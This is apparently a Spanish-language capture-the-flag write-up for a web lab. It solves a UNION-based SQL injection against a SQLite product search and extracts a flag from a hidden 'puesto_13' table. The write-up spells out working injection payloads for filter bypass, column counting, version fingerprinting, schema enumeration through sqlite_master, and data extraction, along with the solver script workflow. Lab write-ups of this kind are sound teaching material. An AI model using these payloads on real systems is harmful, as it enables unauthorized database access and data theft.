# La Feria del Persa — feriapersa

| Campo | Valor |
|---|---|
| Categoría | Web — SQL Injection (UNION / SQLite) |
| URL | `https://<host>/catalogo` |
| Estado | ✅ Resuelto |
| Flag | `flag{ejemplo}` |

## Enunciado (resumen)

El «persa» se digitalizó: catálogo, buscador, opiniones de clientes y un sistema de
tickets. Hay productos de procedencia dudosa, reseñas que hablan de cosas que no
aparecen en el catálogo y **un «puesto 13» que nadie ha visto abierto**. La misión es
encontrar lo que quedó escondido entre el inventario.

## 0. Acceso al laboratorio (403 inicial)

Todo el sitio —incluido `/static`— respondía:

```
HTTP/1.1 403 FORBIDDEN
Server: gunicorn
TRAMA CTF // 403
Acceso no autorizado
Este laboratorio debe iniciarse desde la plataforma TRAMA CTF.
```

No era un bypass de cabeceras (`X-Forwarded-For`, `X-Real-IP`, `Host`, `Forwarded`,
etc. → 403), ni el token de API de CTFd (`Authorization: Token ctfd_...` →
redirección a `/login`). La puerta es una **cookie de sesión emitida por la
plataforma** al lanzar la instancia:

```bash
COOKIE="trama_session=Vgb10FPCRELz_...";   # la entrega la plataforma TRAMA CTF
curl -s -b "$COOKIE" https://<host>/catalogo
# -> 200 OK
```

## 1. Reconocimiento del sitio

| Ruta | Qué hay |
|---|---|
| `/catalogo` | 12 productos (Electrónica, Ropa, Calzado, Accesorios, Hogar, Perfumería) |
| `/buscar?q=` | 🔥 buscador (formulario GET) |
| `/opiniones` | 5 reseñas de «caseros» |
| `/ticket` | boleta de ejemplo + **pista** |

Las reseñas y el ticket son las pistas reales:

```
@camilo_t         ★  "Encontré la wa escondida, cero estrellas al puesto 13."
@vecina_curiosa   ★★★ "¿Alguien sabe qué vende el puesto 13? Nunca lo he visto abierto…"

TICKET: ¿Cliente frecuente?
        Pregunta por el descuento VIP en el buscador del catálogo.
        "el sistema reconoce a los que preguntan bonito"
```

Traducción: el buscador es inyectable y esconde algo llamado **puesto 13**.

## 2. Confirmar la inyección

```
q=' OR '1'='1        -> 200, devuelve los 12 productos (bypass del filtro)
q=' ORDER BY 5-- -   -> 200
q=' ORDER BY 6-- -   -> 400   => el SELECT tiene 5 columnas
q=' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -  -> 200
q=' UNION SELECT 1,sqlite_version(),3,4,'X'-- -  -> 3.46.1  (motor: SQLite)
```

Mapeo de columnas en el render de la tarjeta:

| Columna | Campo |
|---|---|
| 1 | imagen (slug; por defecto `puesto_fantasma.png`) |
| 2 | `<h3>` nombre |
| 3 | `<p>` descripción |
| 4 | precio |
| 5 | categoría |

> Detalle que costó: para localizar la fila inyectada entre los 12 productos se
> marca la columna 5 con `'ZZZCAT'`; así se encuentra la tarjeta aunque el
> `ORDER BY` del sitio la mezcle. Y las expresiones no pueden llevar **comas**
> (rompen la lista del `UNION`): se usa `group_concat(col)` y `char(124)` en vez de
> separadores literales.

## 3. Enumeración de la base de datos

```sql
(SELECT group_concat(name) FROM sqlite_master WHERE type='table')
--> productos,resenas,puesto_13
```

Esquema:

```sql
CREATE TABLE productos (id INTEGER PRIMARY KEY, nombre TEXT, descripcion TEXT,
                        precio TEXT, categoria TEXT, imagen TEXT
                        DEFAULT 'img/productos/puesto_fantasma.png');
CREATE TABLE resenas   (id INTEGER PRIMARY KEY, autor TEXT, comentario TEXT,
                        estrellas INTEGER);
CREATE TABLE puesto_13 (id INTEGER PRIMARY KEY, item TEXT,
                        codigo_garantia TEXT NOT NULL);
```

## 4. Extracción de la flag

```sql
(SELECT count(*) FROM puesto_13)          --> 1
(SELECT item FROM puesto_13)              --> Repuesto especial - reservado Puesto 13
(SELECT codigo_garantia FROM puesto_13)   --> flag{ejemplo}
```

## 5. Explotación automática

```bash
python3 solucion/resolver.py
```

```
[*] versión sqlite: 3.46.1
[*] tablas: productos,resenas,puesto_13
[*] puesto 13 contiene: Repuesto especial - reservado Puesto 13

[+] FLAG: flag{ejemplo}
```

## Flag

```
flag{ejemplo}
```

*«La wa [web] escondida era la base de datos»* — el «puesto 13» era una tabla
aparte (`puesto_13`), fuera del catálogo visible.

## Notas

- El reflejo del término de búsqueda se escapa correctamente (no hay XSS útil);
  el vector real es SQLi.
- Errores SQL devuelven un `400` con mensaje amable («Ups. El buscador se enredó…»),
  así que la explotación se hace a ciegas solo para detectar el fallo; la lectura de
  datos es por `UNION`.
- La imagen por defecto (`puesto_fantasma.png`) es la pista visual de que existe un
  producto fuera del catálogo; el nombre coincide con el «puesto 13» de las reseñas.
- `/robots.txt` y `/sitemap.xml` no existen (404): el descubrimiento es por las
  reseñas + el ticket, no por fuerza bruta.

## Archivos de la carpeta

| Ruta | Contenido |
|---|---|
| `flag.txt` | flag final |
| `CONTEXTO.md` | este writeup |
| `solucion/resolver.py` | solver end-to-end (enumera tablas y extrae la flag) |
| `solucion/sqli.py` | cliente SQLi (marca `ZZZCAT`, mapea columnas) |
| `solucion/fase1.py` | versión / tablas / esquema |
| `solucion/fase2.py` | volcado de `puesto_13` y `resenas` |
| `solucion/sonda_buscador.py` | prueba inicial de payloads |
| `solucion/columnas.py` | descubrimiento del número de columnas |
| `solucion/marcadores.py` | mapeo de columnas al HTML renderizado |
| `solucion/tarjetas.py` | parser de tarjetas de producto |
| `solucion/ver_html.py` | HTML → texto legible |
| `work/` | catálogo, opiniones, ticket, respuestas SQLi y `salida_resolver.txt` |
